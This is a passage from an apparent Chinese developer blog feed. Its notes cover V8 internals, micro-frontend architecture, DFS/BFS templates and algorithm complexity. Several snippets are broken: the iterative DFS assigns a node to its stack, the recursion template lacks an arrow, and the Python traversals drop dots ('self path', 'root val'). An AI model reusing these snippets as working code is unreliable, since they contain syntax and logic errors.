class="line">foo()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 在同一任务中执行foo，但不是嵌套执行</span></span><br><span class="line"><span class="comment">// 主线程通过一个while循环，一直拉取微任务，这样的循环会不断创建栈，再销毁栈，所以不会爆栈，但是因为在主线程中执行，所以页面会卡死。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve().then(foo)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p><h3 id="8-惰性解析"><a href="#8-惰性解析" class="headerlink" title="8. 惰性解析"></a>8. 惰性解析</h3><p>V8不会一次性将所有的JS解析为中间代码。</p><ul><li><p>首先，如果一次解析和编译所有的 JavaScript 代码，过多的代码会增加编译时间，这会严重影响到首次执行 JavaScript 代码的速度，让用户感觉到卡顿。因为有时候一个页面的 JavaScript 代码都有 10 多兆，如果要将所有的代码一次性解析编译完成，那么会大大增加用户的等待时间；</p></li><li><p>其次，解析完成的字节码和编译之后的机器代码都会存放在内存中，如果一次性解析和编译所有 JavaScript 代码，那么这些中间代码和机器代码将会一直占用内存，特别是在手机普及的年代，内存是非常宝贵的资源。</p></li></ul><p>基于以上的原因，所有主流的 JavaScript 虚拟机都实现了<strong>惰性解析</strong>。所谓惰性解析是指解析器在解析的过程中，如果遇到函数声明，那么会跳过函数内部的代码，并不会为其生成 AST 和字节码，而仅仅生成顶层代码的 AST 和字节码。</p><h3 id="9-闭包"><a href="#9-闭包" class="headerlink" title="9. 闭包"></a>9. 闭包</h3><p>虽然<code>foo</code>函数的执行上下文被销毁了，但是依然存活的<code>inner</code>函数引用了<code>foo</code>函数作用域中的变量<code>d</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> d = <span class="number">200</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + d</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> f = foo()</span><br></pre></td></tr></table></figure></p><p><strong>这个时候带来了两个问题：</strong></p><ul><li><code>foo</code>执行结束时，变量<code>d</code>该不该被销毁？</li><li>如果采用惰性解析，执行到<code>foo</code>函数时，V8只会解析<code>foo</code>函数，不会解析内部的<code>inner</code>函数，那么V8就不知道<code>inner</code>中引用了变量<code>d</code></li></ul><p><strong>那应该怎样处理？</strong><br>正确的处理方式应该是<code>foo</code>函数的执行上下文被销毁，但是<code>inner</code>函数引用的<code>foo</code>函数中的变量不能被销毁。此时V8就要对此做特殊处理，负责处理这个任务的模块叫做<strong>预解析器</strong></p><p>V8 引入预解析器，比如当解析顶层代码的时候，遇到了一个函数，那么预解析器并不会直接跳过该函数，而是对该函数做一次快速的预解析，其主要目的有两个</p><ul><li>判断是否存在语法错误</li><li>检查函数内部是否引用了外部变量，如果是则将栈中的变量赋值到堆中。下次执行该函数时，直接使用堆中的引用，解决了闭包带来的问题。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Q: 变量a会被分配到栈上？还是堆上？</span></span><br><span class="line">  <span class="comment">// A: 堆上。预解析器阶段在堆中复制了一个一样的a，调用foo函数使foo出栈栈中的a被销毁，只剩下堆中的a</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t1 = foo()</span><br><span class="line"><span class="keyword">const</span> t2 = foo()</span><br><span class="line">t1() <span class="comment">// 0 </span></span><br><span class="line">t1() <span class="comment">// 1</span></span><br><span class="line">t2() <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><h3 id="10-代码缓存"><a href="#10-代码缓存" class="headerlink" title="10. 代码缓存"></a>10. 代码缓存</h3><h3 id="11-隐藏类：如何在内存中快速查找对象属性？"><a href="#11-隐藏类：如何在内存中快速查找对象属性？" class="headerlink" title="11. 隐藏类：如何在内存中快速查找对象属性？"></a>11. 隐藏类：如何在内存中快速查找对象属性？</h3><p>JavaScript 在运行时，对象的属性是可以被修改的，所以当 V8 使用了一个对象时，比如使用了 start.x 的时候，它并不知道该对象中是否有 x，也不知道 x 相对于对象的偏移量是多少，也可以说 V8 并不知道该对象的具体的形状。</p><p>而静态语言中，在声明一个对象前需要先定义该对象的结构。代码执行前需要先被编译，编译时，每个对象的形状都是固定的。因此可以直接通过偏移量查询对象的属性值，</p><p>这也就是静态语言的执行效率更高的原因。</p><p><strong>怎样将这种静态的特性引入V8中？</strong><br>答案是可行的。V8 执行到这段代码时，会先为 point 对象创建一个隐藏类，在 V8 中，把隐藏类又称为 map，每个对象都有一个 map 属性，其值指向内存中的隐藏类。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> point = &#123;<span class="attr">x</span>:<span class="number">100</span>,<span class="attr">y</span>:<span class="number">200</span>&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * point对象的隐藏类，查找point.x的流程是，先查找对象point的隐藏类</span></span><br><span class="line"><span class="comment"> * 再通过隐藏类查找x属性偏移量，然后根据偏移量获取属性值</span></span><br><span class="line"><span class="comment"> * attr  offset</span></span><br><span class="line"><span class="comment"> * x     4</span></span><br><span class="line"><span class="comment"> * y     8</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></p><h3 id="12-内联缓存"><a href="#12-内联缓存" class="headerlink" title="12. 内联缓存"></a>12. 内联缓存</h3><p>如果一个函数中利用了对象的属性，并且这个函数会被多次执行，那么 V8 就会考虑，怎么将这个查找过程再度简化，最好能将属性的查找过程能一步到位。</p><p>因此，V8 引入了 IC，IC 会监听每个函数的执行过程，并在一些关键的地方埋下监听点，这些包括了加载对象属性 (Load)、给对象属性赋值 (Store)、还有函数调用 (Call)，V8 会将监听到的数据写入一个称为反馈向量 (FeedBack Vector) 的结构中，同时 V8 会为每个执行的函数维护一个反馈向量。有了反馈向量缓存的临时数据，V8 就可以缩短对象属性的查找路径，从而提升执行效率。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这两段代码谁的执行效率更高？</span></span><br><span class="line"><span class="keyword">let</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">data.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">console</span>.log(item.toString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> data = [<span class="string">'1'</span>, <span class="number">2</span>, <span class="string">'3'</span>, <span class="number">4</span>]</span><br><span class="line">data.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">console</span>.log(item.toString())</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一种方式效率更高。</span></span><br><span class="line"><span class="comment">第一种方式中，每一个item类型一样，后续几次调用toString可以直接命中，是单态。</span></span><br><span class="line"><span class="comment">第二种方式中，由于item类型间错不同，经常变换，就要同时缓存多个类型，是多态。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="13-V8如何实现回调函数？"><a href="#13-V8如何实现回调函数？" class="headerlink" title="13. V8如何实现回调函数？"></a>13. V8如何实现回调函数？</h3><p>回调函数：只有当某个函数被作为参数，传递给另外一个函数，或者传递给宿主环境，然后该函数在函数内部或者在宿主环境中被调用，才称为<strong>回调函数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 本质是readFileSync是在主线程上执行的，readFile在读写线程中执行的</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">var</span> data = fs.readFileSync(<span class="string">'test.js'</span>)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'test.txt'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">    data.toString()  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>每个宏任务在执行时，V8会重新创建栈。<br>微任务看成是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。</p><ul><li><p>微任务<br>V8 会为每个宏任务维护一个微任务队列。当 V8 执行一段 JavaScript 时，会为这段代码创建一个环境对象，微任务队列就是存放在该环境对象中的。当你通过 Promise.resolve 生成一个微任务，该微任务会被 V8 自动添加进微任务队列，等整段代码快要执行结束时，该环境对象也随之被销毁，但是在销毁之前，V8 会先处理微任务队列中的微任务。</p></li><li><p>async/await<br>async 是一个通过异步执行并隐式返回 Promise 作为结果的函数。</p></li></ul><p>通常，await 可以等待两种类型的表达式：可以是任何普通表达式 ;也可以是一个 Promise 对象的表达式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们使用 await 等待一个没有 resolve 的 Promise，那么这也就意味着，getResult 函数会一直等待下去。</span></span><br><span class="line"><span class="comment">// 我们可以用resolve来恢复该协程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NeverResolvePromise</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="keyword">await</span> NeverResolvePromise()</span><br><span class="line">  <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">getResult()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><h3 id="14-垃圾回收"><a href="#14-垃圾回收" class="headerlink" title="14.垃圾回收"></a>14.垃圾回收</h3><p>======</p><h3 id="重学前端——浏览器工作原理"><a href="#重学前端——浏览器工作原理" class="headerlink" title="重学前端——浏览器工作原理"></a>重学前端——浏览器工作原理</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>微前端</title>
      <link href="/2021/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/"/>
      <url>/2021/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/</url>
      <content type="html"><![CDATA[<h3 id="1-微前端是什么"><a href="#1-微前端是什么" class="headerlink" title="1. 微前端是什么"></a>1. 微前端是什么</h3><p>微前端，就是将一个巨无霸的前端工程拆分成一个一个的小工程。它们完全具备独立的开发、运行能力。整个系统就将由这些小工程协同合作，实现所有页面的展示与交互。</p><p><br></p><h3 id="2-为什么要用微前端"><a href="#2-为什么要用微前端" class="headerlink" title="2. 为什么要用微前端"></a>2. 为什么要用微前端</h3><ul><li>打包速度：工程越来越大，打包越来越慢</li><li>多人多地协作：多人在同一个工程里开发，遭遇代码冲突的概率会很频繁，而且冲突的影响面比较大。</li><li>测试难度：由于代码都在一个仓库里，每次发布修改都会催生大面积的测试工作</li></ul><p><br></p><h3 id="3-实现微前端"><a href="#3-实现微前端" class="headerlink" title="3.实现微前端"></a>3.实现微前端</h3><ul><li>路由分发：nginx反向代理，简单快速/完全隔离，但是应用之间切换会有白屏，状态共享困难</li><li>iframe：快速集成，但是通信差、性能差</li><li>插件机制：Webpack5 Module Federation（模块联邦），按需加载模块，支持动态更新</li></ul><p><br></p><h3 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4. 注意事项"></a>4. 注意事项</h3><ul><li><p><em>用户登录机制</em><br>将用户的统一登录和认证问题交给了SSO，所有的项目的后端Server都要接入SSO校验登录状态，从而保障业务系统间用户安全认证的一致性。</p></li><li><p><em>引用公共库</em><br>每一个业务工程都是一个独立的前端工程，所以里面会有一些相同的依赖，如 Vue、moment、lodash 等。如果将这些内容都打包到各自的 vendor.js 里，则势必会导致代码冗余太多，浏览器运行内存压力增大。我们把这些公共依赖、公共组件、CSS、Fonts 等都放到一个工程里，由该工程进行打包，将依赖、组件 export，并以 UMD 的方式注入到全局。</p></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5cadd7835188251b2f3a4bb0" target="_blank" rel="noopener">微前端实践</a></li><li><a href="https://blog.csdn.net/lizhipeng123321/article/details/81868136" target="_blank" rel="noopener">前端微服务整合之‘‘插拔式架构’‘实现方案</a></li><li><a href="https://www.cnblogs.com/meituantech/p/9604591.html" target="_blank" rel="noopener">用微前端的方式搭建类单页应用</a></li><li><a href="https://juejin.im/post/5b45d0ea6fb9a04fa42f9f1a" target="_blank" rel="noopener">实施微前端的六种方式</a></li><li><a href="https://www.jianshu.com/p/1f409df7de45" target="_blank" rel="noopener">「微前端」- 将微服务理念扩展到前端开发（实践篇）</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端工程设计-业务组件</title>
      <link href="/2021/01/28/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E7%BB%84%E4%BB%B6/"/>
      <url>/2021/01/28/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E7%BB%84%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>表单<br>列表<br>选择器<br>面包屑<br>向导 i-ward<br>业务组件</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>深度优先搜索、广度优先搜索</title>
      <link href="/2020/08/23/LeetCode-%E9%80%92%E5%BD%92/"/>
      <url>/2020/08/23/LeetCode-%E9%80%92%E5%BD%92/</url>
      <content type="html"><![CDATA[<h3 id="1-代码模板"><a href="#1-代码模板" class="headerlink" title="1. 代码模板"></a>1. 代码模板</h3><ul><li>每个节点有且仅访问一次</li><li>访问节点的顺序不同可分为BFS, DFS</li></ul><h4 id="1-1-递归通用模板"><a href="#1-1-递归通用模板" class="headerlink" title="1.1 递归通用模板"></a>1.1 递归通用模板</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> recursion = (level, params) &#123;</span><br><span class="line">  <span class="comment">// recursion terminator 终止条件</span></span><br><span class="line">  <span class="keyword">if</span> (level &gt; MAX_LEVEL) &#123;</span><br><span class="line">    process_result</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// process current level</span></span><br><span class="line">  process(level, params)</span><br><span class="line">  <span class="comment">// drill down</span></span><br><span class="line">  recursion(level + <span class="number">1</span>, parms)</span><br><span class="line">  <span class="comment">// clean current level status if need</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-DFS-深度优先搜索"><a href="#1-1-DFS-深度优先搜索" class="headerlink" title="1.1 DFS 深度优先搜索"></a>1.1 DFS 深度优先搜索</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归写法</span></span><br><span class="line"><span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line"><span class="keyword">const</span> dfs = <span class="function"><span class="params">node</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (visited.has(node)) <span class="keyword">return</span></span><br><span class="line">  visited.add(node)</span><br><span class="line">  dfs(node.left)</span><br><span class="line">  dfs(node.right)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非递归写法</span></span><br><span class="line"><span class="keyword">const</span> dfs = <span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">const</span> visited = []</span><br><span class="line">  <span class="keyword">const</span> stack = node</span><br><span class="line">  <span class="keyword">while</span> (stack.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = stack.pop()</span><br><span class="line">    visited.push(node)</span><br><span class="line">    process(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> nodes = generate_related_nodes(node)</span><br><span class="line">    stack.push(nodes)</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-BFS-广度优先搜索"><a href="#1-2-BFS-广度优先搜索" class="headerlink" title="1.2 BFS 广度优先搜索"></a>1.2 BFS 广度优先搜索</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bfs = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">const</span> queue = [root]</span><br><span class="line">  <span class="keyword">while</span> (queue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> level = []</span><br><span class="line">    <span class="keyword">const</span> n = queue.length</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> node = queue.pop()</span><br><span class="line">      level.push(node.val)</span><br><span class="line">      <span class="keyword">if</span> (node.left) queue.unshift(node.left)</span><br><span class="line">      <span class="keyword">if</span> (node.right) queue.unshift(node.right)</span><br><span class="line">    &#125;</span><br><span class="line">    result.push(level)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-用途"><a href="#2-用途" class="headerlink" title="2. 用途"></a>2. 用途</h3><h4 id="2-1-子集"><a href="#2-1-子集" class="headerlink" title="2.1 子集"></a>2.1 子集</h4><h4 id="2-2-组合"><a href="#2-2-组合" class="headerlink" title="2.2 组合"></a>2.2 组合</h4><h4 id="2-3-排列"><a href="#2-3-排列" class="headerlink" title="2.3 排列"></a>2.3 排列</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>算法</title>
      <link href="/2020/08/14/%E7%AE%97%E6%B3%95/"/>
      <url>/2020/08/14/%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<ol start="0"><li>数据结构</li></ol><ul><li>一维<br>  · 基础：数组 array, string, 链表 linked list<br>  · 高级: 栈 stack， 队列 queue， 双端队列 deque, 集合 set, 映射 map(hash or map)</li><li>二维<br>  · 基础: 树 tree, 图 graph<br>  · 高级: 二叉搜索树 binary search tree(red-black tree, AVL), 堆heap，并查集disjoint set, 字典树 Trie</li><li>特殊<br>  · 位运算 Bitwise， 布隆过滤器 BloomFilter<br>  · LRU Cache</li></ul><ol start="0"><li>算法<br>任何的高级算法最后都会转换为if-else, for loop和递归这三种最朴素的运算操作</li></ol><ul><li>if-else, switch -&gt; branch</li><li>for, while loop -&gt; iteration</li><li>递归Recursion(Divide &amp; Conquer, Backtrace)</li><li>搜索Search: 深度优先搜索 Depth first search, 广度优先搜索 Breadth first search, A*</li><li>动态规划 Dynamic Programming</li><li>二分查找 Binary Search</li><li>贪心 Greedy</li><li>数学 Math, 几何 Geometry<br>注意：在头脑中回忆上面每种算法的思想和代码模板</li></ul><ol><li>时间复杂度：根据n的情况会运行多少次<br>常见的7种复杂度，只看最高复杂度的运算<br>O(1): 常数复杂度<br>O(log n): 对数复杂度<br>O(n): 线性时间复杂度<br>O(n^2): 平方<br>O(n^3): 立方<br>O(n!): 阶乘<br>O(2^n): 指数；每多展开一层，运行的节点数是上一层的两倍。第一层有1个节点，第二层有2个节点，第三层有4个节点，它的运行次数是按指数级递增的。所以当你下到最后一层，大概是2^n个节点。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>在递归的情景，一般有4种常见情况：</p><ul><li>二分查找Binary Search: 一般发生在一个有序数列里，你要在里面找到你的目标数，它每次都一分为二，只查一遍就下去了。所以时间复杂度是O(log n)</li><li>二叉树查找：我们会每个节点都访问一次，且仅访问一次，所以时间复杂度为O(n)。n代表树里面的节点总数</li><li>二维矩阵: 有序的二维矩阵中进行二分查找，O(n)</li><li>归并排序：最优的解决方法 O(n log n)</li></ul><ol start="2"><li><p>空间复杂度<br>主要看数组的长度，递归的深度</p></li><li><p>数组，链表，跳表<br>如果对ArrayList进行大量的修改操作，它会涉及到非常多的array copy，把数组的片段复制来复制去，比较低效。而LinkedList链表，这个数据结构是为了弥补数组的这个缺点，在数据修改增删比较频繁的情况下，数组其实并不好用。而LinkedList就是这样的元素，有value和next， next指向下一个元素，串在一起就变成了一个类似于数组的结构。</p></li></ol><p>数组 时间复杂度<br>prepend O(1) : 正常情况下数组的prepend操作的时间复杂度是O(n)，但是可以特殊优化到O(1)。采用的方式是申请稍大一些的内存空间，然后再数组最开始预留一部分空间，prepend操作把头下标前移一个位置即可。<br>append O(1)<br>lookup O(1)<br>insert O(n)<br>delete O(n)</p><p>链表 时间复杂度<br>prepend O(1)<br>append O(1)<br>lookup O(n)<br>insert O(1)<br>delete O(1)</p><p>跳表 Skip List<br>注意：只能用于有序的链表。跳表用来取代的是平衡树和二分查找，是一种插入/删除/搜索都是O(log n)的数据结构。</p><p>现实中，它会由于元素的增加和删除导致它的索引，经过多次增加删除后，它有时会跨一步，有时会跨两步，不是非常的工整。而且它的维护成本相对比较高，当你增加一个元素时，你需要把它的索引更新一遍。导致它的时间复杂度变成O(log n)</p><p>链表的空间复杂度</p><ul><li>原始链表大小为n,每2个结点抽1个，每层索引的结点数n/2, n/4, n/8 …。因此空间复杂度是O(n)</li></ul><ol start="4"><li>树，二叉树，二叉搜索树<br>为什么树的解法一般是递归？<br>树本身的定义，没有后继的结构，或者便于循环的机构，使其没法有效第进行所谓的循环。树只有左节点和右节点，因此当你需要去访问它的子树时，更好的方式，是直接对它的左节点调用相同的遍历函数。</li></ol><p>二叉搜索树：也称二叉排序树，有序二叉树，排序二叉树，是指一棵空树或者具有下列性质的二叉树：</p><ul><li>左子树上所有结点的值均小于它的根节点的值；</li><li>右子树上所有结点的值均大于它的根节点的值；</li><li>以此类推：左、右子树也分别为二叉查找树</li></ul><p>插入，查询操作都是O(log n)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self path.append(root val)</span><br><span class="line">        self preorder(root left)</span><br><span class="line">        self preorder(root right)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self inorder(root left)</span><br><span class="line">        self path.append(root val)</span><br><span class="line">        self inorder(root right)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        self backorder(root left)</span><br><span class="line">        self backorder(root right)</span><br><span class="line">        self path.append(root val)</span><br></pre></td></tr></table></figure></p><ol start="5"><li>递归的实现、特性以及思维要点<br>递归 - 循环，通过函数体来进行的循环。之前有一段函数，或者一段指令写在某个地方，就直接不断地反复跳到之前那段指令，不断地执行。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def Factorial(n):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * Factorial(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion</span><span class="params">(level, param1, param2, ...)</span>:</span></span><br><span class="line">    <span class="comment"># recursion terminator 递归终结条件</span></span><br><span class="line">    <span class="keyword">if</span> level &gt; MAX_LEVEL:</span><br><span class="line">        process_result</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># process login in current level 处理当前层的路基</span></span><br><span class="line">    process(level, data...)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># drill down 下探到下一层</span></span><br><span class="line">    recursion(level + <span class="number">1</span>, p1 ...)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reverse the current level status if needed 清理当前层</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>设计模式</title>
      <link href="/2020/07/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/07/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
